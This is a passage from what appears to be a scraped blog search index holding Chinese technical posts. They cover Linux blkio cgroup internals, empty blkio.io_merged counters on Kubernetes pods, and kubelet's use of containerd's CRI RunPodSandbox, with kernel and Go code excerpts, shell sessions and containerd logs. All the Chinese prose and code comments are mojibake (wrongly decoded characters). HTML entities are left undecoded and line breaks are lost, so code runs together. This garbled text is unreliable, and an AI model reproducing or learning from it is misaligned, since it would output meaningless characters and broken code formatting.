æ˜¯å¦‚ä½•æ³¨å†Œçš„è¿™äº›ä¿¡æ¯ä¸­, è™½ç„¶å¯¹å…¶ä¸€éƒ¨åˆ†é€»è¾‘è¿˜æ²¡æœ‰å®Œå…¨ææ‡‚,ä½†æ˜¯æˆ‘çŸ¥é“äº†è¿™ä¸ªéšç€ CFQ ä¸€èµ·åˆå§‹åŒ–äº†,åœ¨å†…æ ¸ç©ºé—´ä¸­ç»´æŠ¤ä¸€äº›å˜é‡. 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * blkcg_policy_register - register a blkcg policy * @pol: blkcg policy to register * * Register @pol with blkcg core. Might sleep and @pol may be modified on * successful registration. Returns 0 on success and -errno on failure. */int blkcg_policy_register(struct blkcg_policy *pol)&#123;\tstruct blkcg *blkcg;\tint i, ret;....\t/* register @pol */\tpol-&gt;plid = i;\tblkcg_policy[pol-&gt;plid] = pol;\t/* allocate and install cpd&#x27;s */\tif (pol-&gt;cpd_alloc_fn) &#123; list_for_each_entry(blkcg, &amp;all_blkcgs, all_blkcgs_node) &#123; struct blkcg_policy_data *cpd; cpd = pol-&gt;cpd_alloc_fn(GFP_KERNEL);... blkcg-&gt;cpd[pol-&gt;plid] = cpd; // çœ‹åˆ°ç°åœ¨å¯¹è¿™äº›ä¸æ˜¯å¾ˆæ˜ç™½ cpd-&gt;blkcg = blkcg; cpd-&gt;plid = pol-&gt;plid; pol-&gt;cpd_init_fn(cpd); &#125;\t&#125;..\t/* everything is in place, add intf files for the new policy */\tif (pol-&gt;dfl_cftypes)// cgroup_add_dfl_cftypes å‡½æ•°æè¿° add an array of cftypes for default hierarchy // Similar to cgroup_add_cftypes() but the added files are only used for the default hierarchy. WARN_ON(cgroup_add_dfl_cftypes(&amp;io_cgrp_subsys, pol-&gt;dfl_cftypes));\tif (pol-&gt;legacy_cftypes)// cgroup_add_legacy_cftypes - add an array of cftypes for legacy hierarchies// Similar to cgroup_add_cftypes() but the added files are only used for the legacy hierarchies.// å…¶å®åˆ°è¿™é‡Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªåœ°æ–¹å°±æ˜¯å¤„ç†æ–‡ä»¶åˆå§‹åŒ–çš„åœ°æ–¹, è¿™é‡Œè¯´çš„æ˜¯æ–‡ä»¶åˆå§‹åŒ–ä¸åŒ…å«å†…å®¹æ­£ç¡®.// è¿™é‡Œåœ¨ cgroup fs blkio ä¸­åˆ›å»ºæ–‡ä»¶çš„åœ°æ–¹, æ‹¼æ¥åå­—ä¹Ÿæ˜¯åœ¨è¿™é‡Œå®Œæˆçš„. WARN_ON(cgroup_add_legacy_cftypes(&amp;io_cgrp_subsys, pol-&gt;legacy_cftypes));.... // ç§»é™¤ä¸€äº›é”™è¯¯å¤„ç†çš„ä»£ç ,ä¸»è¦æ˜¯å†…æ ¸åˆ†é…å†…å­˜å¤±è´¥é‡Šæ”¾å†…å­˜çš„é€»è¾‘EXPORT_SYMBOL_GPL(blkcg_policy_register); ä¸‹é¢è¿™ä¸ªå°±æ˜¯æŒ‰ç…§å†…æ ¸æä¾›çš„ cgroup æ¡†æ¶å®ç°çš„ä¸€ä¸ª controller group çš„ sub system åå­—å« blkio, å…¶å® cgroup æ¡†æ¶çš„æŠ½è±¡ä¹Ÿèƒ½çŒœæµ‹è¡Œä¸º, å¦‚æœçŒœçš„ä¸å¯¹å¯ä»¥çœ‹ kernel/cgroup.c ä¸­çš„è°ƒç”¨æ–¹å¼. 123456789101112struct cgroup_subsys io_cgrp_subsys = &#123;\t.css_alloc = blkcg_css_alloc, // css alloc = cgroup subsystem çš„ å†…å­˜åˆ†é…\t.css_offline = blkcg_css_offline, // å°±æ˜¯ä¸‹æ‰å½“å‰ sub system, å…¶å®æ²¡æœ‰æ€ä¹ˆåœ¨ç”Ÿäº§ä¸­è§è¿‡ä¸‹æ‰ sub system\t.css_free = blkcg_css_free, // é‡Šæ”¾å†…å­˜\t.can_attach = blkcg_can_attach, // ä» https://elixir.bootlin.com/linux/v4.9.10/source/kernel/cgroup.c#L5179 ä¸»è¦æ˜¯å’Œç®¡ç†å½“å‰`å±‚çº§`task çš„\t.bind = blkcg_bind, // æ–‡ä»¶ç³»ç»Ÿé‡Œé¢çš„ mount bind\t.dfl_cftypes = blkcg_files, // æ¶‰åŠçš„ç”¨æˆ·æ€æ–‡ä»¶\t.legacy_cftypes = blkcg_legacy_files, // æ¶‰åŠçš„ç”¨æˆ·æ€æ–‡ä»¶\t.legacy_name = &quot;blkio&quot;,...&#125;;EXPORT_SYMBOL_GPL(io_cgrp_subsys); ä»¥ä¸ŠåŸºæœ¬ä¸Šå°† blkio åœ¨ cfq å®ç°çš„åˆå§‹åŒ–. å›å¤´çœ‹ io_merged å­˜åœ¨å†…å®¹ä¸ºç©ºé—®é¢˜cgroup blkio çœ‹ä¸€ä¸‹ blkio.io_merged è¿™ä¸ªæ–‡ä»¶å†™çš„è¿‡ç¨‹. linux vfs 1. [è…¾è®¯ Tlinux çš„ä¸€ä¸ªä¼˜åŒ–](https://github.com/Tencent/TencentOS-kernel/commit/e7636c1b8b5e4214b68d048ae3d3442045ea757c#diff-aa274e206b462ae50089a5a3e16d6926e2001404a1876032316f7c37e08cd111) å¯ä»¥åœ¨ github ä¸Šçœ‹åˆ°,åš pre blkcg çš„éš”ç¦»","tags":["k8s"]},{"title":"blkio cgroup å¼‚å¸¸","path":"/2021/05/10/blk-io-1/","content":"blkio cgroup å¼‚å¸¸çº¿ä¸Šé›†ç¾¤ pod çš„ç£ç›˜ç›‘æ§æ•°æ®ä¸¢å¤±ï¼Œç»è¿‡å…¶ä»–åŒå­¦çš„è¯Šæ–­å‘ç°æ˜¯ cgroup å¼‚å¸¸ blkio æºç åˆ†æ k8s å¯¹ cgroup çš„æ”¯æŒhttps://www.youtube.com/watch?v=u8h0e84HxcE historyblk-group-support.png 123456789101112131415161718192021root@xxx:/home/xxxx# for i in $(ls -d /sys/fs/cgroup/blkio/kubepods/pod*/); do echo $i &amp;&amp; cat $i/blkio.io_merged; done/sys/fs/cgroup/blkio/kubepods/pod10543084-fcc4-11ea-8ffd-525400cdb22d/Total 0/sys/fs/cgroup/blkio/kubepods/pod24b4819f-dbb5-11ea-8ffd-525400cdb22d/Total 0/sys/fs/cgroup/blkio/kubepods/pod7376584e-e05f-11ea-8ffd-525400cdb22d/Total 0/sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0/sys/fs/cgroup/blkio/kubepods/poddd0ee417-e36e-11ea-8ffd-525400cdb22d/8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0 åˆæ­¥ç»“è®º æ²¡æœ‰æŒ‰ç…§æˆ‘å¯¹ cgroup å±‚æ¬¡æ¦‚å¿µè¿›è¡Œç»§æ‰¿ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘ç†è§£ä¸å¯¹ã€‚ æµ‹è¯• 11234567891011121314root@xxxb:/sys/fs/cgroup/blkio/kubepods# mkdir testroot@xxxb:/sys/fs/cgroup/blkio/kubepods# cat test/blkio.io_mergedTotal 0root@xxxb:/sys/fs/cgroup/blkio/kubepods# cat /proc/23365/cmdlinetoproot@xxxb:/sys/fs/cgroup/blkio/kubepods# echo &quot;23365&quot; &gt; test/tasksroot@xxxb:/sys/fs/cgroup/blkio/kubepods# cat test/tasks23365root@xxxb:/sys/fs/cgroup/blkio/kubepods# cat test/blkio.io_merged # ä¸èƒ½æœ‰æ•ˆè®°å½• buffer io, åªèƒ½è®°å½• direct ioTotal 0 çš„ç¡®æ˜¯æ²¡æœ‰ï¼Œå‘ç°blkio.io_mergedæ–‡ä»¶æœ‰å†…å®¹ã€‚å‘ç° dnode1-1091 å‘ç°å…¨éƒ¨éƒ½æ˜¯ merged total 0 123456root@xxx:/sys/fs/cgroup/blkio/kubepods# cat /sys/fs/cgroup/blkio/kubepods/pod*/blkio.io_mergedTotal 0Total 0Total 0Total 0Total 0 åŒä¸€ä¸ª pod çš„ä¸åŒ container ä¹Ÿæœ‰å·®å¼‚12345678910root@xxxa:/sys/fs/cgroup/blkio# cat /sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a/blkio.io_mergedTotal 0root@xxxa:/sys/fs/cgroup/blkio# cat /sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/b640917f50fd1235a43e49e5075ef20ca2b79f733e5cd36dd38ead228fb06e54/blkio.io_merged8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0 ä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤è¾“å‡ºæ²¡æœ‰å®è´¨æ€§å·®å¼‚ 1root@xxx:/sys/fs/cgroup/blkio# docker inspect b640917f50fd1235a43e49e5075ef20ca2b79f733e5cd36dd38ead228fb06e54 1root@xxx:/sys/fs/cgroup/blkio# docker inspect e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a ä¸åŒç‰ˆæœ¬å†…æ ¸å¯¹æ¯”123456789101112131415161718192021222324252627282930root@xxx:/sys/fs/cgroup/blkio# mkdir test1root@xxx:/sys/fs/cgroup/blkio# cat test1/blkio.io_merged_recursiveTotal 0root@xxx:/sys/fs/cgroup/blkio# cgexec -g blkio:test1 time dd if=/dev/zero of=/home/test1 bs=1k count=100 oflag=direct100+0 records in100+0 records out102400 bytes (102 kB) copied, 0.00640967 s, 16.0 MB/s0.00user 0.11system 0:00.11elapsed 95%CPU (0avgtext+0avgdata 2184maxresident)k0inputs+350outputs (0major+89minor)pagefaults 0swapsroot@xxx:/sys/fs/cgroup/blkio# cat test1/blkio.io_merged_recursive8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0root@xxx:/sys/fs/cgroup/blkio# cat test1/blkio.io_merged8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0root@xxx:/sys/fs/cgroup/blkio# uname -sirLinux 4.9.0-0.bpo.6-amd64 unknown ä½¿ç”¨å·²ç»å­˜åœ¨çš„ cgroup å»é™åˆ¶ io ,å‘ç° cgroup é‡Œé¢çš„æ•°æ®å·²ç»è¢«åˆå§‹åŒ–äº†ã€‚ 12345678910111213141516171819# cgexec -g blkio:kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a time dd if=/dev/zero of=/home/test1 bs=1k count=100 oflag=direct100+0 records in100+0 records out102400 bytes (102 kB) copied, 0.119833 s, 855 kB/s0.00user 0.00system 0:00.12elapsed 3%CPU (0avgtext+0avgdata 2324maxresident)k0inputs+350outputs (0major+90minor)pagefaults 0swaps# cat /sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a/blkio.io_merged8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0# docker exec -it 39d9ab5e31a2 dd if=/dev/zero of=/home/test1 bs=1k count=100 oflag=direct100+0 records in100+0 records out102400 bytes (102 kB, 100 KiB) copied, 0.076378 s, 1.3 MB/s ç»“è®ºåœ¨ 4.9.0 ç‰ˆæœ¬ä¸Š blkio.io_merged æ˜¯æ‡’æƒ°åˆå§‹åŒ–ï¼Œåœ¨æ²¡æœ‰å‘ç”Ÿ direct io çš„ä¹‹å‰ä¸ä¼šæœ‰åˆå§‹åŒ–å‡ºè¿™ä¸ªæ–‡ä»¶ã€‚","tags":["k8s"]},{"title":"kubelet æ˜¯å¦‚ä½•ä½¿ç”¨ containerd","path":"/2021/01/06/kubelet-use-cotnainerd/","content":"æ¢³ç†è¿™ä¸ªç›®çš„æ˜¯ä¸ºäº†ä»¥å containerd ä¸Šçº¿æå‰å‚¨å¤‡ç›¸å…³çŸ¥è¯†ï¼Œé¢„è®¾é—®é¢˜è¿˜æ˜¯ä¹‹å‰çš„ POD æ˜¯å¦‚ä½•åˆ›å»ºï¼Œä»¥æ­¤æ¥æ‘¸ç´¢ä»–çš„è°ƒç”¨é“¾è·¯ã€‚ kubelet-create-pod å‚æ•°å¯¹æ¯”å¯¹æ¯”ä¸€ä¸‹ kubelet ä½¿ç”¨ dockerd å’Œ cotnainerd å‚æ•°çš„å¯¹æ¯”ï¼Œæœ€æ ¸å¿ƒçš„åœ°æ–¹å°±æ˜¯ --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock æŒ‡å®š CRI çš„åœ°å€è°ƒç”¨åœ°å€ï¼Œè€Œ docker é»˜è®¤æ˜¯ä½¿ç”¨çš„ /var/run/docker.sock docker çš„å‘½ä»¤è¡Œå‚æ•° /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --allowed-unsafe-sysctls=net.core.somaxconn --cloud-provider=aws --eviction-hard=memory.available&lt;1Mi,nodefs.available&lt;1Mi,nodefs.inodesFree&lt;1 --max-pods=110 --network-plugin=cni containerd çš„å‘½ä»¤è¡Œå‚æ•° /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --fail-swap-on=false --node-ip= --fail-swap-on=false containerd çš„ CRI å®ç°åˆ†æä¸€ä¸‹ containerd çš„å¯åŠ¨ä¿¡æ¯ï¼Œä¼šå¯¹å…³é”®ä¿¡æ¯åšå‡ºæ ‡ç¤ºã€‚ 12345678910111213141516Jan 06 06:58:39 kind-control-plane systemd[1]: Started containerd container runtime.Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.310871000Z&quot; level=info msg=&quot;starting containerd&quot; revision=449e926990f8539fd00844b26c07e2f1e306c760 version=v1.3.3-14-g449e9269 // ç‰ˆæœ¬ä¿¡æ¯... åˆ é™¤å’Œå½“å‰è¯é¢˜ä¸ç›¸å…³çš„æ—¥å¿—Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.628292200Z&quot; level=info msg=&quot;loading plugin \\&quot;io.containerd.grpc.v1.cri\\&quot;...&quot; type=io.containerd.grpc.v1Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.628593500Z&quot; level=info msg=&quot;Start cri plugin with config &#123;PluginConfig:&#123;ContainerdConfig:&#123;Snapshotter:overlayfs DefaultRuntimeName:runc DefaultRuntime:&#123;Type: Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125; UntrustedWorkloadRuntime:&#123;Type: Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125; Runtimes:map[runc:&#123;Type:io.containerd.runc.v2 Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125; test-handler:&#123;Type:io.containerd.runc.v2 Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125;] NoPivot:false&#125; CniConfig:&#123;NetworkPluginBinDir:/opt/cni/bin NetworkPluginConfDir:/etc/cni/net.d NetworkPluginMaxConfNum:1 NetworkPluginConfTemplate:&#125; Registry:&#123;Mirrors:map[docker.io:&#123;Endpoints:[https://registry-1.docker.io]&#125;] Configs:map[] Auths:map[]&#125; DisableTCPService:true StreamServerAddress:127.0.0.1 StreamServerPort:0 StreamIdleTimeout:4h0m0s EnableSelinux:false SandboxImage:k8s.gcr.io/pause:3.2 StatsCollectPeriod:10 SystemdCgroup:false EnableTLSStreaming:false X509KeyPairStreaming:&#123;TLSCertFile: TLSKeyFile:&#125; MaxContainerLogLineSize:16384 DisableCgroup:false DisableApparmor:false RestrictOOMScoreAdj:false MaxConcurrentDownloads:3 DisableProcMount:false&#125; ContainerdRootDir:/var/lib/containerd ContainerdEndpoint:/run/containerd/containerd.sock RootDir:/var/lib/containerd/io.containerd.grpc.v1.cri StateDir:/run/containerd/io.containerd.grpc.v1.cri&#125;&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.628725100Z&quot; level=info msg=&quot;Connect containerd service&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.629022800Z&quot; level=info msg=&quot;Get image filesystem path \\&quot;/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs\\&quot;&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.654848300Z&quot; level=info msg=&quot;loading plugin \\&quot;io.containerd.grpc.v1.introspection\\&quot;...&quot; type=io.containerd.grpc.v1Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.656292800Z&quot; level=info msg=serving... address=/run/containerd/containerd.sock.ttrpc Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.656821700Z&quot; level=info msg=serving... address=/run/containerd/containerd.sock // è¿™é‡Œå°±æ˜¯å¯åŠ¨çš„å…³é”®ç‚¹ï¼Œå¯¹å¤–æä¾›ä¸€ä¸ª sock Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.657936200Z&quot; level=info msg=&quot;containerd successfully booted in 0.349859s&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.656645700Z&quot; level=info msg=&quot;Start subscribing containerd event&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.659444000Z&quot; level=info msg=&quot;Start recovering state&quot;Jan 06 06:58:41 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:41.336754900Z&quot; level=info msg=&quot;Start event monitor&quot;Jan 06 06:58:41 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:41.337037100Z&quot; level=info msg=&quot;Start snapshots syncer&quot;Jan 06 06:58:41 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:41.337099000Z&quot; level=info msg=&quot;Start streaming server&quot; io.containerd.grpc.v1.cri çš„å®ç°æˆ‘ä»¬æµ‹è¯•ç¯å¢ƒçš„ç‰ˆæœ¬æ˜¯ 1.3.3ï¼Œcheckout å‡ºç›¸å…³ä»£ç å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç ã€‚åœ¨æ–°çš„ç‰ˆæœ¬ä¸­ cotnaienrd cri ä»£ç ä»“åº“å·²ç»åˆå¹¶åˆ°äº†çš„ containerd ä»£ç ä»“åº“äº†ã€‚ 1import _ &quot;github.com/containerd/cri&quot; ä»ä»£ç åˆ†æå¯ä»¥çœ‹å‡ºç«¯å€ªï¼Œå½“å‰ç‰ˆæœ¬åŒ…è£…äº† containerd å®ç°äº†çš„æ˜¯ v1alpha2 çš„ CRI å®šä¹‰ã€‚ 123456func (c *criService) register(s *grpc.Server) error &#123;\tinstrumented := newInstrumentedService(c)\truntime.RegisterRuntimeServiceServer(s, instrumented) // è¿™ä¸ª runtime æ˜¯ import runtime &quot;k8s.io/cri-api/pkg/apis/runtime/v1alpha2&quot;\truntime.RegisterImageServiceServer(s, instrumented)\treturn nil&#125; çœ‹ä¸€ä¸‹æ ¸å¿ƒå‡½æ•° CRI çš„æ ¸å¿ƒæ¥å£ RunPodSandboxï¼Œä¹‹æ‰€ä»¥å…ˆçœ‹è¿™ä¸ªå‡½æ•°ä¸»è¦åŸå› æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°ç»™ POD å‡†å¤‡äº†ç½‘ç»œç­‰ç­‰ä¹Ÿç¬¦åˆ POD çš„åˆ›å»ºçš„æ—¶é—´åºåˆ— 123456789101112131415func (in *instrumentedService) RunPodSandbox(ctx context.Context, r *runtime.RunPodSandboxRequest) (res *runtime.RunPodSandboxResponse, err error) &#123;\tif err := in.checkInitialized(); err != nil &#123; return nil, err\t&#125;\tlog.G(ctx).Infof(&quot;RunPodsandbox for %+v&quot;, r.GetConfig().GetMetadata())\tdefer func() &#123; if err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;RunPodSandbox for %+v failed, error&quot;, r.GetConfig().GetMetadata()) &#125; else &#123; log.G(ctx).Infof(&quot;RunPodSandbox for %+v returns sandbox id %q&quot;, r.GetConfig().GetMetadata(), res.GetPodSandboxId()) &#125;\t&#125;()\tres, err = in.c.RunPodSandbox(ctrdutil.WithNamespace(ctx), r)\treturn res, errdefs.ToGRPC(err)&#125; container å·² plugin å®ç°çš„ RunPodSandboxå’Œ dockershim çš„ç‰ˆæœ¬å®ç°æ²¡æœ‰æœ¬è´¨åŒºåˆ«ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271// RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure// the sandbox is in ready state.func (c *criService) RunPodSandbox(ctx context.Context, r *runtime.RunPodSandboxRequest) (_ *runtime.RunPodSandboxResponse, retErr error) &#123;\tconfig := r.GetConfig()\tlog.G(ctx).Debugf(&quot;Sandbox config %+v&quot;, config)\t// Generate unique id and name for the sandbox and reserve the name.\tid := util.GenerateID()\tmetadata := config.GetMetadata() // éƒ½æ˜¯ kubelet ä¼ å…¥çš„\tif metadata == nil &#123; return nil, errors.New(&quot;sandbox config must include metadata&quot;)\t&#125;\tname := makeSandboxName(metadata)\tlog.G(ctx).Debugf(&quot;Generated id %q for sandbox %q&quot;, id, name)\t// Reserve the sandbox name to avoid concurrent `RunPodSandbox` request starting the\t// same sandbox.\tif err := c.sandboxNameIndex.Reserve(name, id); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to reserve sandbox name %q&quot;, name)\t&#125;\tdefer func() &#123; // Release the name if the function returns with an error. if retErr != nil &#123; c.sandboxNameIndex.ReleaseByName(name) &#125;\t&#125;()\t// Create initial internal sandbox object.\tsandbox := sandboxstore.NewSandbox( sandboxstore.Metadata&#123; ID: id, Name: name, Config: config, RuntimeHandler: r.GetRuntimeHandler(), &#125;, sandboxstore.Status&#123; State: sandboxstore.StateUnknown, &#125;,\t)\t// Ensure sandbox container image snapshot.\timage, err := c.ensureImageExists(ctx, c.config.SandboxImage, config)\tif err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to get sandbox image %q&quot;, c.config.SandboxImage)\t&#125;\tcontainerdImage, err := c.toContainerdImage(ctx, *image)\tif err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to get image from containerd %q&quot;, image.ID)\t&#125;\tociRuntime, err := c.getSandboxRuntime(config, r.GetRuntimeHandler())\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to get sandbox runtime&quot;)\t&#125;\tlog.G(ctx).Debugf(&quot;Use OCI %+v for sandbox %q&quot;, ociRuntime, id)\tsecurityContext := config.GetLinux().GetSecurityContext()\t//Create Network Namespace if it is not in host network\thostNet := securityContext.GetNamespaceOptions().GetNetwork() == runtime.NamespaceMode_NODE\tif !hostNet &#123; // If it is not in host network namespace then create a namespace and set the sandbox // handle. NetNSPath in sandbox metadata and NetNS is non empty only for non host network // namespaces. If the pod is in host network namespace then both are empty and should not // be used. sandbox.NetNS, err = netns.NewNetNS() if err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to create network namespace for sandbox %q&quot;, id) &#125; sandbox.NetNSPath = sandbox.NetNS.GetPath() defer func() &#123; if retErr != nil &#123; if err := sandbox.NetNS.Remove(); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to remove network namespace %s for sandbox %q&quot;, sandbox.NetNSPath, id) &#125; sandbox.NetNSPath = &quot;&quot; &#125; &#125;() // Setup network for sandbox. // Certain VM based solutions like clear containers (Issue containerd/cri-containerd#524) // rely on the assumption that CRI shim will not be querying the network namespace to check the // network states such as IP. // In future runtime implementation should avoid relying on CRI shim implementation details. // In this case however caching the IP will add a subtle performance enhancement by avoiding // calls to network namespace of the pod to query the IP of the veth interface on every // SandboxStatus request. if err := c.setupPodNetwork(ctx, &amp;sandbox); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to setup network for sandbox %q&quot;, id) &#125; defer func() &#123; if retErr != nil &#123; // Teardown network if an error is returned. if err := c.teardownPodNetwork(ctx, sandbox); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to destroy network for sandbox %q&quot;, id) &#125; &#125; &#125;()\t&#125;\t// Create sandbox container.\tspec, err := c.generateSandboxContainerSpec(id, config, &amp;image.ImageSpec.Config, sandbox.NetNSPath, ociRuntime.PodAnnotations)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate sandbox container spec&quot;)\t&#125;\tlog.G(ctx).Debugf(&quot;Sandbox container %q spec: %#+v&quot;, id, spew.NewFormatter(spec))\tvar specOpts []oci.SpecOpts\tuserstr, err := generateUserString( &quot;&quot;, securityContext.GetRunAsUser(), securityContext.GetRunAsGroup(),\t)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate user string&quot;)\t&#125;\tif userstr == &quot;&quot; &#123; // Lastly, since no user override was passed via CRI try to set via OCI // Image userstr = image.ImageSpec.Config.User\t&#125;\tif userstr != &quot;&quot; &#123; specOpts = append(specOpts, oci.WithUser(userstr))\t&#125;\tseccompSpecOpts, err := generateSeccompSpecOpts( securityContext.GetSeccompProfilePath(), securityContext.GetPrivileged(), c.seccompEnabled)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate seccomp spec opts&quot;)\t&#125;\tif seccompSpecOpts != nil &#123; specOpts = append(specOpts, seccompSpecOpts)\t&#125;\tsandboxLabels := buildLabels(config.Labels, containerKindSandbox)\truntimeOpts, err := generateRuntimeOptions(ociRuntime, c.config)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate runtime options&quot;)\t&#125;\topts := []containerd.NewContainerOpts&#123; containerd.WithSnapshotter(c.config.ContainerdConfig.Snapshotter), customopts.WithNewSnapshot(id, containerdImage), containerd.WithSpec(spec, specOpts...), containerd.WithContainerLabels(sandboxLabels), containerd.WithContainerExtension(sandboxMetadataExtension, &amp;sandbox.Metadata), containerd.WithRuntime(ociRuntime.Type, runtimeOpts)&#125;\tcontainer, err := c.client.NewContainer(ctx, id, opts...) // ä¸Šä¸€ç¯‡çš„è°ƒç”¨ containerd å†™ metadata if err != nil &#123; return nil, errors.Wrap(err, &quot;failed to create containerd container&quot;)\t&#125;\tdefer func() &#123; if retErr != nil &#123; deferCtx, deferCancel := ctrdutil.DeferContext() defer deferCancel() if err := container.Delete(deferCtx, containerd.WithSnapshotCleanup); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to delete containerd container %q&quot;, id) &#125; &#125;\t&#125;()\t// Create sandbox container root directories.\tsandboxRootDir := c.getSandboxRootDir(id)\tif err := c.os.MkdirAll(sandboxRootDir, 0755); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to create sandbox root directory %q&quot;, sandboxRootDir)\t&#125;\tdefer func() &#123; if retErr != nil &#123; // Cleanup the sandbox root directory. if err := c.os.RemoveAll(sandboxRootDir); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to remove sandbox root directory %q&quot;, sandboxRootDir) &#125; &#125;\t&#125;()\tvolatileSandboxRootDir := c.getVolatileSandboxRootDir(id)\tif err := c.os.MkdirAll(volatileSandboxRootDir, 0755); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to create volatile sandbox root directory %q&quot;, volatileSandboxRootDir)\t&#125;\tdefer func() &#123; if retErr != nil &#123; // Cleanup the volatile sandbox root directory. if err := c.os.RemoveAll(volatileSandboxRootDir); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to remove volatile sandbox root directory %q&quot;, volatileSandboxRootDir) &#125; &#125;\t&#125;()\t// Setup sandbox /dev/shm, /etc/hosts, /etc/resolv.conf and /etc/hostname.\tif err = c.setupSandboxFiles(id, config); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to setup sandbox files&quot;)\t&#125;\tdefer func() &#123; if retErr != nil &#123; if err = c.unmountSandboxFiles(id, config); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to unmount sandbox files in %q&quot;, sandboxRootDir) &#125; &#125;\t&#125;()\t// Update sandbox created timestamp.\tinfo, err := container.Info(ctx)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to get sandbox container info&quot;)\t&#125;\t// Create sandbox task in containerd.\tlog.G(ctx).Tracef(&quot;Create sandbox container (id=%q, name=%q).&quot;, id, name)\tvar taskOpts []containerd.NewTaskOpts\t// TODO(random-liu): Remove this after shim v1 is deprecated.\tif c.config.NoPivot &amp;&amp; (ociRuntime.Type == plugin.RuntimeRuncV1 || ociRuntime.Type == plugin.RuntimeRuncV2) &#123; taskOpts = append(taskOpts, containerd.WithNoPivotRoot)\t&#125;\t// We don&#x27;t need stdio for sandbox container.\ttask, err := container.NewTask(ctx, containerdio.NullIO, taskOpts...) // 